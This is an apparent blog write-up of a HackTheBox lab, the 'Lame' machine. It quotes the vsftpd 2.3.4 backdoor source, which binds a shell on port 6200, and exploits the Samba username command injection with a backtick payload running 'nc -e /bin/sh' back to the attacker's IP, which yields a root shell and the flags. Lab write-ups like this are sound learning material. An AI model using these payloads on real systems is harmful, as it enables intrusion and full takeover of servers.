# Lame

Hello and welcome to my first ever pentest report! Today we are conquering HackTheBox's easy machine "Lame".

I've gone ahead and booted up my Kali virtual machine, and I have connected to the HackTheBox VPN network. After starting up the box on their website, I get the IP address `10.10.10.3`.

## Getting Started

Let's get going with a port scan using `nmap`:

```
$ sudo nmap -sV -sC 10.10.10.3

Nmap done: 1 IP address (1 host up) scanned in 56.44 seconds
```

Let's summarize `nmap`'s findings:

- There is an FTP server on (the usual) port 21, allowing anonymous login
- SSH is running as normal on port 22
- A SMB server (`smbd`) is running on both port 139 and port 445.
  - Port 445 is for modern SMB traffic over TCP
  - Port 139 is for legacy Windows computers using [NetBIOS](https://en.wikipedia.org/wiki/NetBIOS_over_TCP/IP).

I usually start with FTP, especially since we can use anonymous login, because we will need some form of credentials to enumerate the other ports.

```
$ ftp anonymous@10.10.10.3

Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
229 Entering Extended Passive Mode (|||7674|).
150 Here comes the directory listing.
226 Directory send OK.
```

As you can see, we are able to log in as `anonymous` without providing any password (just press ENTER), but when we request a directory listing it appears there are no files on the FTP server at all! That is quite strange, and makes me think there must be something else about this FTP server that we can use. Let's take a look at the version again, as reported by `nmap`:

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
```

When looking up `vsftpd 2.3.4 vulnerability` online, we quickly discover that this version
[contained a backdoor](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)! More specifically, a distribution server for `vsftpd` was compromised and the distribution code altered with a backdoor for some period of time.

## A backdoor?!

Yeah, really. Let's take a look at the modifications that were made to `vsftpd` to see if we can exploit this:

```c
// ...

else if((p_str->p_buf[i]==0x3a) && (p_str->p_buf[i+1]==0x29))
{
    vsf_sysutil_extra();
}

// ...
```

What is this code doing? Well, its looking through the username string, looking for two characters: `0x3a` and `0x29`, which represent `:` and `)` respectively. That is to say, it's looking for a smiley face `:)` in the username!

If it finds a smiley face, it calls `vsf_sysutil_extra()`:

```c
int
vsf_sysutil_extra(void)
{
  int fd, rfd;
  struct sockaddr_in sa;
  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
  exit(1);
  memset(&sa, 0, sizeof(sa));
  sa.sin_family = AF_INET;
  sa.sin_port = htons(6200);
  sa.sin_addr.s_addr = INADDR_ANY;
  if((bind(fd,(struct sockaddr *)&sa,
  sizeof(struct sockaddr))) < 0) exit(1);
  if((listen(fd, 100)) == -1) exit(1);
  for(;;)
  {
    rfd = accept(fd, 0, 0);
    close(0); close(1); close(2);
    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
    execl("/bin/sh","sh",(char *)0);
  }
}
```

It opens a TCP socket on port `6200` and spawns a `/bin/sh` shell for incoming connections :)

This looks like something we can easily exploit:

```
$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:kali): hello:)world
331 Please specify the password.
Password:
ftp: Login failed
ftp> quit
```

Now we try to connect to port 6200:

```
nc 10.10.10.3 6200
```

And we get... nothing! Unfortunately this exploit does not seem to work on this box. After attempting several times I am unable to get a shell to appear in netcat.

### Metasploit to the rescue??

I also attempted to use the Metaploit framework to perform the exploit, and it still did not work, but it at least confirmed that I did not make a mistake:

```
$ msfconsole
Metasploit tip: The use command supports fuzzy searching to try and
select the intended module, e.g. use kerberos/get_ticket or use
kerberos forge silver ticket

Let's move on!

## Samba ðŸŽ¶

Next we'll take a peek at the SMB server running on ports `139/tcp` and `445/tcp`

There are five shares, but which ones can we access without login? `smbmap` to the rescue!

There isn't anything interesting here, it seems like a bunch of temporary files that I would expect in `/tmp`. Let's again, look up the version of this service:

```
PORT    STATE SERVICE     VERSION

445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

We can use `searchsploit` to look up this version faster than I can Google:

Shellcodes: No Results
```

We'll pick the third one on the list, as it is the most specific to our version (`3.0.20`). [Looking up the CVE](https://nvd.nist.gov/vuln/detail/CVE-2007-2447), we can exploit a vulnerability in, again, the username. If we provide a username `` `id` `` between backticks like that, the command `id` will be executed just like it would on the Linux command line (where we often use `$()` for this). The exploit uses `nohup` to allow the command to run for longer than the SMB session. Let's try it!

```
$ nc -lvnp 4444

---> SWITCH TO NEW TAB

$ smbclient //10.10.10.3/tmp -U './=`nohup nc -e /bin/sh 10.10.14.8 4444`'
Password for [=`NOHUP NC -E \bin/sh 10.10.14.8 4444`]:
session setup failed: NT_STATUS_LOGON_FAILURE
```

We use `nohup` to run a `nc` netcat connection with the flag `-e`:

```
-e filename  specify filename to exec after connect
```

Our value is `/bin/sh` which is a basic shell.

Lastly we provide the IP address of our attacker machine on which the listener is running: `10.10.14.8`, and the port on which the listener is listening: `4444`.

Weirdly enough my command seems to be getting uppercased, so this is not going to work. Let's try alternative authentication. We can change users once authenticated:

```
$ smbclient //10.10.10.3/tmp
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> logon "./=`nohup nc -e /bin/sh 10.10.14.8 4444`"
Password:
```

If we then go check on my other tab where I have my listener running

```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.3] 59663
```

We seem to have a connection, let's run a command to see if we have a shell:

```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.3] 59663
id
uid=0(root) gid=0(root)
```

We can use Python (if installed) to upgrade this shell by spawning Bash:

```
python -c 'import pty; pty.spawn("bash")'
root@lame:/#
```

That worked! We now have a nice shell as `root`! We jumped straight from nothing to being able to claim both the user and root flag:

```
root@lame:/# ls /home
ftp  makis  service  user

root@lame:/# cd /home/makis

root@lame:/home/makis# ls
user.txt

root@lame:/home/makis# cat user.txt
6a1abab17b9b3cdfdf22364e4db95b85

root@lame:/home/makis# cd /root

root@lame:/root# cat root.txt
81d0f4a72f55e73718ccb82e8ebc7d0c
```

And that wraps up my first post! Thank you so much for reading, and see you next time!
